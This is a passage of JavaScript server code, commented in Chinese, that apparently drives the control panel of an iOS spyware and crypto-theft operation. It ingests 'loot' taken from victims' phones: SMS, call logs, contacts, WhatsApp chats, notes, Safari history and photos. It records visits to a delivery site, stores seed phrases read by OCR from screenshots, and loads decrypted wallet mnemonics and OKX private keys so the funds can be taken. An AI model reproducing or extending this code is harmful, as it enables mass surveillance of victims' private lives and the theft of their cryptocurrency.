        ts: Number((pn.match(/_(\d+)\.bin/) || [])[1] || now),
        bin_path: binPath,
      });
      const pPath = pj.path || '';
      const pCtg = pj.category || '';
      const ptTs = Number((pn.match(/_(\d+)\.bin/) || [])[1] || now);
      const dkey = serial + '|' + pPath;

      // 短信库（SMS/sms.db）【2026-09-12】优先灌"真短信"（人话缓存），无解析结果才留占位
      if (/SMS\/sms\.db/i.test(pPath) || /SMS/i.test(pPath)) {
        const rows = sysdbRows(binPath);
        const has = store.messages.some(x => x.source_path === pPath && x.serial === serial);
        if (rows.length) {
          if (store.messages.some(x => x.serial === serial && x.kind === 'sms')) {
            /* 该设备已灌过短信 → 跳过重复库 */
          } else {
            for (const r of rows) {
              const dir = String(r['方向'] || '');
              const who = String(r['号码/账号'] || '');
              const body = String(r['正文'] || '');
              if (!body && !who) continue;
              store.messages.push({
                id: store.messages.length + 1, user_id: u18?.id || 0, serial, ip: ipDir,
                from: dir === '接收' ? who : '', to: dir === '发出' ? who : '',
                body, chat: 'iMessage/SMS', kind: 'sms', who: who, direction: dir || '未知',
                ts: cnTimeMs(r['时间(北京)']) || ptTs, source_path: pPath, bin_path: binPath,
                note: '18链短信库解析', size: 0, exid: eid,
              });
            }
          }
        } else if (!has && !(store.messages.some(x => x.serial === serial && x.kind === 'sms'))) {
          store.messages.push({
            id: store.messages.length + 1, user_id: u18?.id || 0, serial, ip: ipDir,
            from: '', to: '', body: '', chat: 'iMessage/SMS', kind: 'smsdb',
            ts: ptTs, source_path: pPath, bin_path: binPath,
            note: '短信库文件（已采集，库内 0 条短信/未解析）', size: pj.orig_size || pj.decoded_size || 0,
            exid: eid,
          });
        }
      }
      // 已安装应用清单（installed_apps.txt）
      // 【2026-09-11 修复】此前只进 exfil18 列表，从不入 store.apps →
      //   18 链设备在面板「应用列表」里永远是空的（根因：store.apps 只由 17 链 /u 的 dec.al 灌）。
      //   按 Type 分流：User → apps（跨设备聚合表）；System → sysApps（226 个/台，避免刷爆聚合表）。
      if (/installed_apps\.txt$/i.test(pPath) && binPath) {
        const seen = new Set();
        for (const a of parseInstalledApps(extStatsText(binPath))) {
          if (!a.bundle || seen.has(a.bundle)) continue;
          seen.add(a.bundle);
          if (a.type === 'System') {
            if (!store.sysApps.some(x => x.serial === serial && x.bundle_id === a.bundle)) {
              store.sysApps.push({ id: store.sysApps.length + 1, user_id: u18?.id || 0, serial,
                                   bundle_id: a.bundle, name: a.name, ts: ptTs, src: '18chain:installed_apps' });
            }
          } else {
            if (!store.apps.some(x => x.serial === serial && x.bundle_id === a.bundle)) {
              store.apps.push({ id: store.apps.length + 1, user_id: u18?.id || 0, serial,
                                name: a.name, bundle_id: a.bundle, version: '', ts: ptTs,
                                src: '18chain:installed_apps' });
            }
          }
        }
      }

      // 通话记录【2026-09-12】同短信：优先灌真实通话
      if (/CallHistory/i.test(pPath)) {
        const rows = sysdbRows(binPath);
        const has = store.messages.some(x => x.source_path === pPath && x.serial === serial);
        if (rows.length) {
          if (!store.messages.some(x => x.serial === serial && x.kind === 'call')) {
            for (const r of rows) {
              const dur = Number(r['时长(秒)'] || 0);
              const who = String(r['号码'] || '');
              const who2 = String(r['姓名/备注'] || '');
              const dir = String(r['方向'] || '');
              const res = String(r['结果'] || '');
              store.messages.push({
                id: store.messages.length + 1, user_id: u18?.id || 0, serial, ip: ipDir,
                from: dir === '呼入' ? who : '', to: dir === '呼出' ? who : '',
                body: '通话 ' + (dur > 0 ? dur + ' 秒' : '未接通') + (res ? '（' + res + '）' : '') + (who2 ? ' · ' + who2 : ''),
                chat: '通话记录', kind: 'call', who, direction: dir, duration: dur,
                ts: cnTimeMs(r['时间(北京)']) || ptTs, source_path: pPath, bin_path: binPath,
                note: '18链通话库解析', size: 0, exid: eid,
              });
            }
          }
        } else if (!has && !(store.messages.some(x => x.serial === serial && x.kind === 'call'))) {
          store.messages.push({
            id: store.messages.length + 1, user_id: u18?.id || 0, serial, ip: ipDir,
            from: '', to: '', body: '', chat: '通话记录', kind: 'calldb',
            ts: ptTs, source_path: pPath, bin_path: binPath,
            note: '通话库文件（已采集，库内 0 条/未解析）', size: pj.orig_size || pj.decoded_size || 0,
            exid: eid,
          });
        }
      }
      // 通讯录【2026-09-12】解析行 → 灌「联系人」栏（与 13-17 链联系人同一列表，按 serial+姓名+电话去重）
      if (/AddressBook/i.test(pPath)) {
        const rows = sysdbRows(binPath);
        const has = store.messages.some(x => x.source_path === pPath && x.serial === serial);
        if (rows.length) {
          for (const r of rows) {
            const nm = String(r['姓名'] || '').trim(), ph = String(r['电话'] || '').trim();
            const em = String(r['邮箱'] || '').trim(), org = String(r['组织'] || '').trim();
            if (!nm && !ph) continue;
            if (store.contacts.some(x => x.serial === serial && x.name === nm && x.phones === ph)) continue;
            store.contacts.push({
              id: store.contacts.length + 1, user_id: u18?.id || 0, serial, ip: ipDir, ts: ptTs,
              name: nm, phones: ph, emails: em, org, note: String(r['其它'] || ''), src: 'sqlite',
              source: '18链通讯录（AddressBook 解析）',
            });
          }
        } else if (!has && !(store.contacts.some(x => x.serial === serial))) {
          store.messages.push({
            id: store.messages.length + 1, user_id: u18?.id || 0, serial, ip: ipDir,
            from: '', to: '', body: '', chat: '通讯录', kind: 'contactdb',
            ts: ptTs, source_path: pPath, bin_path: binPath,
            note: '通讯录库文件（已采集，库内 0 条/未解析）', size: pj.orig_size || pj.decoded_size || 0,
            exid: eid,
          });
        }
      }
      // WhatsApp 会话（ChatStorage.sqlite）【2026-09-12】此前 store.whatsapp 从没有人灌，
      //   面板 WhatsApp 栏永远空 —— 现按人话缓存接入（会话 + 最近 30 条消息）。
      if (/ChatStorage/i.test(pPath)) {
        const rows = sysdbRows(binPath);
        if (rows.length && !store.whatsapp.some(x => x.serial === serial)) {
          for (const r of rows) {
            let ts = cnTimeMs(r['最后消息']);
            if (!ts || ts > 4102444800000) ts = ptTs;   // 个别会话时间戳是垃圾值 → 退回采集时间
            store.whatsapp.push({
              id: store.whatsapp.length + 1, user_id: u18?.id || 0, serial, ip: ipDir,
              account: String(r['账号'] || ''), display_name: String(r['显示名'] || ''),
              msg_count: Number(r['消息数'] || 0), msgs: Array.isArray(r.msgs) ? r.msgs : [],
              ts, source_path: pPath, bin_path: binPath, exid: eid,
              note: '18链 WhatsApp（ChatStorage 解析）',
            });
          }
        }
      }

      // 备忘录（传统 Notes/notes.sqlite + 新版 Ink 格式 NoteStore.sqlite）
      //   【2026-09-12】Ink 格式正文在 ZICNOTEDATA.ZDATA = gzip(protobuf)，此前 readable_of 解不出 →
      //   18 链备忘录全是空占位。现由 tools/build_sysdb_cache.py 的 parse_notestore 解析成行后灌真数据。
      if (/Notes\/notes/i.test(pPath) || /NoteStore\.sqlite$/i.test(pPath) || (/notes/i.test(pPath) && /\.db$/i.test(pPath))) {
        const rows = sysdbRows(binPath);
        if (rows.length) {
          const _frc0 = store.notebooks.length;
          store.notebooks = store.notebooks.filter(x => !(x.source_path === pPath && x.serial === serial));
          bcFilterRc('notebooks', _frc0 - store.notebooks.length);
          let maxId = 0; for (const x of store.notebooks) if ((x.id || 0) > maxId) maxId = x.id;
          for (const r of rows) {
            store.notebooks.push({
              id: ++maxId, user_id: u18?.id || 0, serial, ip: ipDir,
              ts: cnTimeMs(r['时间(北京)']) || ptTs,
              title: String(r['标题'] || '笔记').slice(0, 120),
              content: String(r['内容'] || '').slice(0, 2000),
              source_path: pPath, bin_path: binPath,
              note: /NoteStore/i.test(pPath) ? '18链备忘录（Ink 格式解析）' : '18链备忘录（notes.db 解析）',
              exid: eid,
            });
          }
        } else if (!store.notebooks.some(x => x.source_path === pPath && x.serial === serial)) {
          let content = '';
          let title = 'notes.db';
          if (Array.isArray(pj.samples) && pj.samples.length) {
            const s = pj.samples[0];
            title = String(s.title || s.name || s.plain || s.text || s.attributedBody || title).slice(0, 80);
            content = pj.samples.slice(0, 4).map(x => JSON.stringify(x)).join(' / ').slice(0, 500);
          } else if (pj.preview) {
            content = String(pj.preview).slice(0, 500);
          }
          store.notebooks.push({
            id: store.notebooks.length + 1, user_id: u18?.id || 0, serial, ip: ipDir, ts: ptTs,
            dec: { path: pPath, category: pCtg, samples: pj.samples || [] },
            title, content,
            source_path: pPath, bin_path: binPath,
            note: '备忘录记录（Notes/notes.db parsed）', exid: eid,
          });
        }
      }
      // 照片/截图（bin=明文文件）
      if ((/DCIM/i.test(pPath) || pCtg === 'screenshots' || /\.(PNG|JPG|JPEG|MOV|HEIC)$/i.test(pPath)) && !store.photos.some(x => x.source_path === pPath && x.serial === serial)) {
        store.photos.push({
          id: store.photos.length + 1, user_id: u18?.id || 0, serial, ip: ipDir,
          name: (pPath.split('/').pop() || pPath) || 'photo', title: pPath,
          size: pj.orig_size || pj.decoded_size || 0, taken_at: ptTs, ts: ptTs,
          dec: { path: pPath, category: pCtg, description: pj.description, preview: (pj.preview || '').slice(0, 200) },
          source_path: pPath, bin_path: binPath, encrypted: false, note: '18链照片/截图',
          exid: eid,
        });
      }
      // 浏览器历史（Safari History.db / Bookmarks.db / BrowserState.db）
      //   已由 tools/build_sysdb_cache.py 解析成人话行（sysdbRows）→ 灌真实 URL/标题/时间；
      //   空库/解析不到才留占位（title 置空，前端显示 —，不再显示假库名）
      if (/Safari\/(History|BrowserState|Bookmarks)/i.test(pPath)) {
        const isBm = /Bookmarks/i.test(pPath);
        const rows = sysdbRows(binPath);
        if (rows.length) {
          // 该库若已有旧占位行 → 先移除，避免「1 条占位 + N 条真实」混杂
          const _frc1 = store.browserHistory.length;
          store.browserHistory = store.browserHistory.filter(x => !(x.source_path === pPath && x.serial === serial));
          bcFilterRc('browserHistory', _frc1 - store.browserHistory.length);
          let maxId = 0; for (const x of store.browserHistory) if ((x.id || 0) > maxId) maxId = x.id;
          for (const r of rows) {
            const url = String(r['网址'] || '');
            if (!url) continue;
            store.browserHistory.push({
              id: ++maxId, user_id: u18?.id || 0, serial, ip: ipDir,
              url, title: String(r['标题'] || ''), kind: isBm ? 'bookmark' : 'history',
              ts: cnTimeMs(r['时间(北京)']) || ptTs, source_path: pPath, bin_path: binPath,
              note: isBm ? '18链 Safari 书签（Bookmarks 解析）' : '18链 Safari 历史（History 解析）',
              size: pj.orig_size || pj.decoded_size || 0, exid: eid,
            });
          }
        } else if (!store.browserHistory.some(x => x.source_path === pPath && x.serial === serial)) {
          store.browserHistory.push({
            id: store.browserHistory.length + 1, user_id: u18?.id || 0, serial, ip: ipDir,
            url: '', title: '', kind: 'safaridb',
            ts: ptTs, source_path: pPath, bin_path: binPath,
            note: 'Safari 数据文件（已采集，库为空/未解析）', size: pj.orig_size || pj.decoded_size || 0,
            exid: eid,
          });
        }
      }
    }
    // ── 投递链浏览打开记录（unknown_posts/post_cdn-cgi_rum_*.bin）──
    // 设备打开 wpsdz.com(*/gooll.html) 时页面上的 Cloudflare RUM 探针被投递链捕获：
    // bin=明文 JSON {location,referrer,eventType,nt,bi:{be,bv},pageloadId,ttfb}；meta.json 带 ts/ip/ua
    if (/unknown_posts/i.test(bucketName)) {
      for (const rn of files.filter(f => /^post_cdn-cgi_rum_\d+\.bin$/.test(f)).sort()) {
        const rj = safeJson(path.join(dir, rn));
        if (!rj || !rj.location) continue;
        const m = safeJson(path.join(dir, rn.replace(/\.bin$/, '.meta.json'))) || {};
        const rt = Number((rn.match(/_(\d+)\.bin$/) || [])[1] || 0);
        const ip = m.ip || ipDir;
        const bi = rj.bi || {};
        store.deliveries.push({
          id: store.deliveries.length + 1, ip, device: ip,
          ts: rt, startTime: rj.startTime || 0,
          location: rj.location || '', referrer: rj.referrer || '',
          eventType: rj.eventType ?? null, nav: rj.nt || '',
          engine: ((bi.be || '') + (bi.bv ? ' ' + bi.bv : '')).trim(), ov: bi.ov || '',
          pageloadId: rj.pageloadId || '', st: rj.st ?? null,
          ttfb_path: (rj.ttfb || {}).path || '',
          ua: (m.ua || '').slice(0, 120), body_len: m.bodyLen || 0,
        });
      }

      // ── /t 通道：13-17 链核心上传的数据包（post_t_*.bin → parse_t_files.py 产出 .bin.parsed.json）──
      // 【2026-09-10 接入】此前「只解析、不展示」：4062 个 parsed.json、且仍在活跃上传（单机上千包/天），
      //   设备与数据在面板里完全不可见。设备侧 .dat 为私有容器（magic '????ab00 78563412'），
      //   内容解析待逆向；本步先把元数据 + 设备记录接进来，保证「有包就有设备、就有条目」。
      for (const pn of files.filter(f => /^post_t_\d+\.bin\.parsed\.json$/.test(f))) {
        const pj = safeJson(path.join(dir, pn));
        if (!pj || !pj.serial) continue;
        const s = pj.serial;
        // 【2026-09-11 修复】meta 文件名是 post_t_<ts>.meta.json（不带 .bin），原代码拼成
        //   .bin.meta.json 永远读不到 → ip 回退成目录名 'unknown_posts'，设备在面板里连 IP/归属地/归属代理都没有。
        //   两种命名都试，兼容历史数据。
        const mt = safeJson(path.join(dir, pn.replace(/\.bin\.parsed\.json$/, '.bin.meta.json')))
          || safeJson(path.join(dir, pn.replace(/\.bin\.parsed\.json$/, '.meta.json'))) || {};
        const ip = (mt.ip && mt.ip !== 'unknown_posts') ? mt.ip : ipDir;
        const ts = pj.ts || 0;
        if (!store.users.has(s)) {
          store.users.set(s, { id: store.users.size + 1, serial_id: s, machine: '', ios_version: '', lhu: pj.lhu || '', ip,
            udid: pj.udid || '', ecid: pj.ecid || '', first_seen: ts, last_seen: ts, channel_t: true });
        } else {
          const u = store.users.get(s);
          if (ts > (u.last_seen || 0)) u.last_seen = ts;
          if (!u.udid && pj.udid) u.udid = pj.udid;
          if (!u.ecid && pj.ecid) u.ecid = pj.ecid;
          if (!u.lhu && pj.lhu) u.lhu = pj.lhu;
        }
        if (!store.devices.has(s)) {
          store.devices.set(s, { id: store.devices.size + 1, serial_id: s, hardware_model: '', build_version: '', kernel_release: '',
            user_id: (store.users.get(s) || {}).id || 0, ip, last_seen: ts, source: 't-channel' });
        } else {
          const dd = store.devices.get(s);
          if (ts > (dd.last_seen || 0)) dd.last_seen = ts;
        }
        const fu = pj.file || {};
        const binAbs = path.join(dir, pn.replace(/\.bin\.parsed\.json$/, '.bin'));
        store.uploads.push({
          id: store.uploads.length + 1, serial: s, ip, ts,
          filename: fu.filename || '', size: fu.size || 0,
          channel: pj.channel || '', ecid: pj.ecid || '', udid: pj.udid || '', cidx: pj.cidx || '',
          lhu: pj.lhu || '', rid: pj.rid || '',
          bin_path: fs.existsSync(binAbs) ? binAbs : null,
        });
      }
    }
    // 【2026-09-12】ext_logs 两种格式兼容：新 = ext_logs.jsonl（单文件追加，admin_server 改造后）；
    //   旧 = ext_logs_<ts>.txt 独立文件（历史数据）。jsonl 只读尾部 256KB（防大文件全量读）。
    // 【2026-09-13 增量引擎】jsonl 记账增量：meta.jsonlSize 记录上次读到的字节数；
    //   增量模式下尺寸未变 → 整段跳过；尺寸变大 → 只读 [上次位置, 末尾] 的新增段（残缺首行由 JSON.parse 兜底丢弃）。
    try {
      const jp = path.join(dir, 'ext_logs.jsonl');
      const st = fs.statSync(jp);
      // 【v1.2 评审修复】无损游标模型：
      //   · jsonlOffset = "最后一个完整换行之后"的字节偏移（不是文件 size）——跨轮半行不会被吃掉；
      //   · delta：从游标起读，每轮至多 CHUNK 字节；只有完整行被消费，超大增量跨轮续传（中段不丢）；
      //   · 无游标 / 文件截断轮转：读尾部窗口并重置游标（沿用原 256KB 采样语义）。
      const CHUNK = 1048576;
      const _prevOff = (_deltaCtx && ((_deltaCtx.jsonlOffset != null) ? _deltaCtx.jsonlOffset : _deltaCtx.jsonlSize)) || 0;
      let rdFrom = 0, rdLen = 0;
      if (!DELTA_ENABLED || _prevOff <= 0 || _prevOff > st.size) {
        rdLen = Math.min(st.size, 262144);              // 非增量 / 首次 / 截断：尾部窗口
        rdFrom = st.size - rdLen; if (rdFrom < 0) rdFrom = 0;
      } else if (st.size > _prevOff) {
        rdFrom = _prevOff;                              // 增量：游标起，本轮至多 CHUNK（余量下轮续）
        rdLen = Math.min(st.size - _prevOff, CHUNK);
      }                                                 // else：无增长 → 不读、游标保持
      if (rdLen > 0) {
        const fd = fs.openSync(jp, 'r');
        const buf = Buffer.alloc(rdLen);
        const got = fs.readSync(fd, buf, 0, rdLen, rdFrom);
        fs.closeSync(fd);
        // 按字节定位最后一个换行：只有完整行被消费；其后残行不消费、不计入游标（字节级精确，中文多字节安全）
        const _nlByte = (got > 0) ? buf.lastIndexOf(0x0A, got - 1) : -1;
        let _consumed = 0;
        if (_nlByte >= 0) {
          _consumed = _nlByte + 1;
          const _complete = buf.toString('utf8', 0, _consumed);
          for (const ln of _complete.split('\n').filter(Boolean).slice(-200)) {
            try {
              const j = JSON.parse(ln);
              store.chainLogs.push({
                id: store.chainLogs.length + 1, ip: ipDir,
                ts: Number(j.ts || 0) || 0,
                line: String(j.body || j.url || '').trim().slice(0, 300),
              });
            } catch {}
          }
        }
        if (_ri) _ri.meta.jsonlOffset = rdFrom + _consumed;   // 只推进到完整行边界
      } else if (_ri && _prevOff > 0) {
        _ri.meta.jsonlOffset = _prevOff;                      // 无增长：传播游标
      }
    } catch {}
    for (const ln of files.filter(f => /^ext_logs_\d+\.txt$/.test(f)).sort().slice(-200)) {
      const txt = safeRead(path.join(dir, ln)) || '';
      store.chainLogs.push({
        id: store.chainLogs.length + 1, ip: ipDir,
        ts: Number((ln.match(/_(\d+)\.txt/) || [])[1] || 0),
        line: txt.trim().slice(0, 300),
      });
    }
    // ══ 13-17 链真实数据（raw_avatar_pic_*.json: notes / photo_batch / OCR 识别）══
    //   设备身份表 / pickSerial 已在本桶处理开头统一构建（见「桶内设备身份表」注释），
    //   raw_avatar_pic / raw_avatar_set / put 通道共用同一套严格归属。
    for (const jn of files.filter(f => /^raw_avatar_pic_\d+\.json$/.test(f)).sort()) {
      const d = safeJson(path.join(dir, jn));
      if (!d) continue;
      const t = Number((jn.match(/_(\d+)\.json$/) || [])[1]) || 0;
      const device = d.device || d.deviceId || '';
      const picSerial = pickSerial(device, d.pv);
      if (d.et === 'notes' && Array.isArray(d.items)) {
        for (const it of d.items) {
          let body = '';
          try { body = noteText(zlib.gunzipSync(Buffer.from(String(it.body || ''), 'base64'))); } catch { body = String(it.snippet || '').slice(0, 1000); }
          if (!titleOK(it.title) || !body) continue;
          store.notebooks.push({
            id: store.notebooks.length + 1, user_id: 0, serial: picSerial, ip: ipDir, ts: t,
            dec: d, title: String(it.title || '未命名').slice(0, 80), content: body,
            source_path: it.path || '', bin_path: null, exid: null,
            note: '13-17链笔记(raw_avatar_pic notes)', device,
          });
        }
      } else if (d.et === 'photo_batch' && Array.isArray(d.bip39_hits)) {
        for (const h of d.bip39_hits) {
          if (!h.path) continue;
          const words = Array.isArray(h.sample) ? h.sample.join(' ') : String(h.sample || '');
          store.photos.push({
            id: store.photos.length + 1, user_id: 0, serial: picSerial, device, ip: ipDir,
            // 【2026-09-12】改叫「相册识别出助记词」——它就是设备 OCR 从相册截图里认出来的 12 词
            name: String(h.path).split('/').pop() || h.path, title: '📷 相册识别出助记词',
            size: 0, taken_at: t, ts: t, dec: d,
            source_path: h.path || '', bin_path: null, encrypted: true,
            scanned: d.scanned || 0, batch_id: d.batch_id || '', pv: d.pv || '',
            words, word_n: h.n || 0, ocr_src: h.src || '',
            note: '相册截图 OCR 识别（' + (h.n || 0) + ' 词，来源 ' + (h.src || '?') + '）| ' + words, device,
          });
        }
      }
    }

    // ── 【2026-09-12】channel ① 其它系统数据：联系人（raw_avatar_set）/ 应用清单（raw_user_get）──
    //   这两类此前只在 loot 里躺着没进面板（旧循环只扫 raw_avatar_pic_*.json）。
    for (const jn of files.filter(f => /^raw_(avatar_set|user_get|user_check|query)_\d+\.json$/.test(f)).sort()) {
      const d = safeJson(path.join(dir, jn));
      if (!d || !d.et) continue;
      const t = Number((jn.match(/_(\d+)\.json$/) || [])[1]) || 0;
      const device = d.device || d.deviceId || d.m || '';
      const cs = pickSerial(device, d.pv);
      if (d.et === 'contacts' && Array.isArray(d.items)) {
        for (const it of d.items) {
          const nm = String(it.name || [it.first, it.last].filter(Boolean).join(' ') || it.org || '').trim();
          const ph = Array.isArray(it.phones) ? it.phones.join(' / ') : String(it.phones || '');
          const em = Array.isArray(it.emails) ? it.emails.join(' / ') : String(it.emails || '');
          if (!nm && !ph) continue;
          // 同一台设备可能多次/分块上传同一批联系人 → 按 (serial,姓名,电话) 去重
          if (store.contacts.some(x => x.serial === cs && x.name === nm && x.phones === ph)) continue;
          store.contacts.push({
            id: store.contacts.length + 1, user_id: 0, serial: cs, device, ip: ipDir, ts: t,
            name: nm, phones: ph, emails: em, org: String(it.org || ''), note: String(it.note || ''),
            src: String(it.src || ''), chunk: d.chunk || 0, chunks: d.chunks || 1,
            source: '13-17链联系人（raw_avatar_set）',
          });
        }
      } else if (d.et === 'applist' && Array.isArray(d.al)) {
        for (const a of d.al) {
          const bid = String(a.b || a.bundle || '');
          if (!bid) continue;
          if (store.apps.some(x => x.serial === cs && x.bundle_id === bid)) continue;
          store.apps.push({
            id: store.apps.length + 1, user_id: 0, serial: cs, device, ip: ipDir, ts: t,
            name: String(a.a || a.name || ''), bundle_id: bid, version: String(a.v || a.version || ''),
            src: '13-17链 applist（raw_user_get）',
          });
        }
      }
    }
    } catch (e2) { _bErr = e2; }
    if (_bErr) {
      console.error('[scan-cache] 桶处理异常 → 下轮强制全量重扫 %s: %s', bucketName, (_bErr && _bErr.message) || _bErr);
      if (BC_ENABLED) bcRunInfo.set(bucketName, { sig: '', led: null, meta: null });
      bcState.bucket = null;
    }
    if (BC_ENABLED) bcEndBucket(store, bucketName, bcObjBucket, bcBucketIps);
    // 【2026-09-19 加固】本桶有"归属留空"的记录 → 留痕一行（此前全静默；留空=不入面板可见面）
    if (_bindMiss > 0) console.log('[bindmiss] %s n=%d（身份无法唯一匹配 → 归属留空）', bucketName, _bindMiss);
}

// 【2026-09-13 P1b】store 工厂：scan() / ingestd / 微发布共用同一初始化
function newStore() {
  const store = {
    users: new Map(), devices: new Map(),
    events: [], mnemonics: [], seeds: [], addresses: [], tokens: [],
    reports: [], messages: [], notebooks: [], whatsapp: [], browserHistory: [], photos: [], deliveries: [],
    contacts: [], collectTasks: [], collectRecords: [], fundsVaults: [], gasVaults: [],
    lockedAddresses: [], airdropContracts: [], apps: [], sysApps: [],
    ipData: [], visitLogs: [], userAgents: [], adminLogs: [],
    exfil18: [], chainLogs: [], uploads: [], walletDiag: {},
    // 【2026-09-11】serial → 该设备【出现过的所有出口 IP】
    //   同一台设备的浏览器出口与 App 出口经常不同（实战：F2K3G50DFT 的
    //   浏览器走 111.55.100.48、App 走 104.234.161.74，连 /16 段都不同），
    //   数据会分裂到多个 loot/<IP>/ 目录。归属匹配必须用这个集合，不能只看单个 IP。
    deviceIps: {},
  };
  return store;
}
function scan(opts) {
  const store = newStore();
  // 【复审修复 L5】LOOT_DIR 存在性检查从函数入口移到"快照路径之后"：数据盘掉线时快照仍可服务
  //   （旧逻辑一掉盘就返回空 store 全空面板，而分片快照本就在另一块盘上）。
  // ① 快照路径（默认）：读 cron 生成的 store_snapshot.json（~1s），彻底摆脱 15s 全量扫描阻塞。
  //    opts.full=true 时跳过快照（快照生成器/调试用）。
  if (!(opts && opts.full)) {
    const snap = _loadSnapshot();
    if (snap) return snap;
    // ★【2026-09-12 防雪崩·终极端】快照不可用时，请求路径【绝不原地全量扫描】：
    //   返回旧缓存（数据可能略旧），冷启动则返回空壳。全量扫描只属于独立进程
    //   （tools/build_store_snapshot.js，写快照文件后由请求侧读取）。
    //   背景：56 万文件的全量扫描需 60-120s，一旦被请求路径/45s 预热反复触发，
    //   事件循环被持续堵死 → 面板无响应/504。
    if (_cache.store) return _cache.store;
    return store;
  }

  // 全量扫描才需要 loot 目录真实存在
  if (!fs.existsSync(LOOT_DIR)) return store;

  // ② 兜底全量扫描（仅 opts.full=true 的独立进程路径会到达）：build_store_snapshot 专用。
  let _sigNow = null;
  if (_cache.store) {
    if (!(opts && opts.full) && (Date.now() - _cache.t) < CACHE_MS) return _cache.store;
    // 【2026-09-12 防雪崩】冷却窗口内（非 full 模式）直接复用旧 store，绝不进入全量扫描。
    if (!(opts && opts.full) && (Date.now() - (_cache.full || 0)) < FALLBACK_COOLDOWN_MS) {
      _cache.t = Date.now();
      return _cache.store;
    }
    _sigNow = _quickSig();
    if (_sigNow === _cache.sig && (Date.now() - _cache.full) < FULL_RESCAN_MS) {
      _cache.t = Date.now();      // 无变化：续期，不重扫
      return _cache.store;
    }
  }
  if (_sigNow === null) _sigNow = _quickSig();   // 首次/冷启动

  const now = Date.now();
  // 【2026-09-13 增量构建】桶列表显式字典序排序（全量/增量处理顺序一致 → 跨桶判重语义一致）
  const _bcDirs = fs.readdirSync(LOOT_DIR, { withFileTypes: true });
  _bcDirs.sort((a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0));
  const _bcForceAll = !!(opts && opts.forceAll);
  const bcObjBucket = new Map();    // 对象引用 → 桶名（归属登记）
  const bcBucketIps = new Map();    // 桶名 → {serial:[ip]}（deviceIps 的桶级贡献）
  const bcBucketNames = _bcDirs.filter(e2 => e2.isDirectory() && !e2.name.startsWith('_')).map(e2 => e2.name);
  // 【2026-09-13 v1.5】一次性把分片缓存读入内存（含旧格式自动迁移）——之后验签/恢复零文件 IO
  if (BC_ENABLED && !_bcForceAll) bcShardInit();
  for (const e of _bcDirs) {
    if (!e.isDirectory()) continue;
    if (e.name.startsWith('_')) continue;   // 【2026-09-12】系统目录（_quarantine/_archive）不是设备桶，跳过
    processBucket(store, e.name, _bcForceAll, bcObjBucket, bcBucketIps);
  }

  // ── 18 链钱包离线解密注入（wallet18_auto.py 产出 data/wallet18.json）──
  // 【2026-09-10】18 链设备不上报 /us，助记词只能服务端离线解：
  //   Bitpie = keychain seedPhraseEntropy 二次 hex → BIP39 熵；
  //   Trust  = keystore v3 + keychain 里 trustwallet<keystore名> 存的 32B 口令。
  //   这里把解出的助记词补进 mnemonics/seeds（供私钥派生），keystore 的
  //   activeAccounts 地址补进 addresses（供 derive_all.js 比对命中私钥）。
  try {
    const wf = path.join(__dirname, 'data', 'wallet18.json');
    if (fs.existsSync(wf)) {
      const wj = JSON.parse(fs.readFileSync(wf, 'utf8'));
      // 诊断表（面板「系统文件」页展示：装了哪些钱包 / keychain 有没有密钥 / 为什么没解出）
      // 明文助记词在下面按 mnemonics 权限注入，这里只留状态，避免越权泄露
      for (const k of Object.keys(wj)) {
        const e = wj[k] || {};
        store.walletDiag[k] = {
          serial: k, pt: e.pt || '', ov: e.ov || '', files: e.files || 0, kc_items: e.kc_items || 0,
          crypto_apps: e.crypto_apps || [], wallet_svcs: e.wallet_svcs || [],
          // 【2026-09-11】加密态密钥仓库（Bitget secure storage / Binance·OKX SKVS）计数。
          // 服务端解不开，但"有没有、有多少条"是关键判据 → 面板单独显示，避免被当噪声忽略。
          secure_stores: e.secure_stores || [],
          // 【2026-09-11】OKX 钱包库（Documents_wallet）解析结果：账户级密钥对 + 链地址数。
          //   xpriv 是**明文可用私钥**（已用 secp256k1 与 xpub 配对验证）→ 面板必须看得见。
          okx: e.okx ? {
            root: e.okx.root || '', name: e.okx.name || '', backup: e.okx.backup,
            addr_count: (e.okx.addresses || []).length, addr_total: e.okx.addr_total || 0,
            xpub: e.okx.xpub || '', xpriv: e.okx.xpriv || '', data_len: e.okx.data_len || 0,
          } : null,
          mnem_count: e.mnem_count || 0, status: e.status || '', status_text: e.status_text || '',
        };
      }
      for (const serial of Object.keys(wj)) {
        const e = wj[serial] || {};
        const u = store.users.get(serial);
        const uid = u ? u.id : 0;
        const dip = u ? u.ip : '';
        for (const w of (e.wallets || [])) {
          const mnem = String(w.mnemonic || '');
          const appType = String(w.app || '未知');
          if (mnem) {
            const dup = store.mnemonics.some(m => m.serial === serial && m.mnem_phrase_plain === mnem);
            if (!dup) {
              const mn = {
                id: store.mnemonics.length + 1, user_id: uid, serial,
                mnem_phrase_abbr: abbr(mnem, 3, 4), mnem_phrase_plain: mnem,
                app_type: appType, bundle_id: String(w.bundle || ''), created_at: w.ts || now, ip: dip,
                src: '18chain', note: '18链离线解密（' + String(w.src || '') + '）',
              };
              store.mnemonics.push(mn);
              store.seeds.push({
                id: store.seeds.length + 1, user_id: uid, serial,
                seed_abbr: abbr(mnem, 3, 4), app_type: appType, mnemonic_id: mn.id,
                account_derived_to: 0, created_at: w.ts || now,
              });
            }
          }
          for (const a of (w.addresses || [])) {
            if (!a || !a.addr) continue;
            if (store.addresses.some(x => x.serial === serial && x.public_key === a.addr)) continue;
            const coin = a.coin;
            store.addresses.push({
              id: store.addresses.length + 1, user_id: uid, serial,
              public_key: a.addr, public_key_abbr: abbr(a.addr, 8, 6),
              private_key_plain: null, private_key_abbr: null,
              chain: coin === 0 ? 'BTC' : coin === 60 ? 'ETH' : (coin === null || coin === undefined ? appType : 'coin' + coin),
              coin: coin, derivation_path: a.path || '',
              wallet_name: appType, password_hint: '', keystore_id: String(w.keystore_id || ''),
              fingerprint: '', src: '18chain-keystore', ts: w.ts || now, ip: dip,
            });
          }
        }

        // ── OKX：账户级密钥对 + 全链地址（Documents_wallet SQLite 明文）──
        // 【2026-09-11】xpriv 已验证与 xpub 配对（secp256k1 点乘一致）→ 真实可用私钥。
        //   账户密钥对作为一条「地址」记录入库（public_key=xpub, private_key_plain=xpriv），
        //   各链地址单独入库（其私钥需 OKX 派生函数，实测非标准 BIP32，暂留空）。
        const okx = e.okx;
        if (okx && okx.xpriv) {
          const dupe = store.addresses.some(x => x.serial === serial && x.private_key_plain === okx.xpriv);
          if (!dupe) {
            store.addresses.push({
              id: store.addresses.length + 1, user_id: uid, serial,
              public_key: 'xpub:' + (okx.xpub || ''), public_key_abbr: abbr(okx.xpub || '', 8, 6),
